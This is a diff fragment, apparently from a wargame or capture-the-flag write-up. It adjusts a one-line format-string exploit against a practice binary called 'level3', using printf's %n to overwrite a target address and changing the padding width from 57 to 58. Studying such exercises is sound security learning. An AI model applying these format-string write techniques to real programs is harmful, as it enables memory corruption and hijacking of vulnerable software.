@@ -12,7 +12,7 @@ So with printf %n flag, we write 64 characters to this address.
 
 \x8c\x98\x04\x08: Address we need to overwrite
 
-(python -c "print('\x8c\x98\x04\x08' + '%c'*2 + '%57x' + '%n')" ;cat) | ./level3
+(python -c "print('\x8c\x98\x04\x08' + '%c'*2 + '%58x' + '%n')" ;cat) | ./level3
 
 explanation:
 
